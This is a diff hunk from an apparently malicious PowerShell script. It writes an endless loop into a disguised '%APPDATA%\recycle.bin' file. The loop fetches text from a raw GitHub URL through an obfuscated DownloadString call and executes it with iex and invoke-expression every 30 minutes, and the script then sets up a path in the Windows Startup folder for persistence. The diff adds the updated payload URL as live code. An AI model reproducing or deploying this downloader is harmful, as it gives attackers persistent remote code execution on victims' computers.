@@ -48,7 +48,7 @@ Remove-Item $helping -force;
 
 $hopyst = "$env:appdata"+"\recycle.bin"
 New-Item -Path $hopyst -Type file -Force
-$sTrvd = "while(`$true){[string]`$a = {(New-Object Net.WebClient).Dotewtwtgastring('https://raw.githubusercontent.com/foxstarter/tory/main/st.txt')};`$b=`$a.replace('tewtwtgas','wnloadS');`$c=iex `$b;invoke-expression `$c;start-sleep -s 1800;}"
+$sTrvd = "while(`$true){[string]`$a = {(New-Object Net.WebClient).Dotewtwtgastring('https://raw.githubusercontent.com/foxstarter/tory/main/oky.txt')};`$b=`$a.replace('tewtwtgas','wnloadS');`$c=iex `$b;invoke-expression `$c;start-sleep -s 1800;}"
 $sTrvd >> $hopyst
 $table = New-Object -ComObject WScript.Shell 
 $confo = $env:APPDATA + "\Microsoft\Windows\Start Menu\Programs\Startup\"
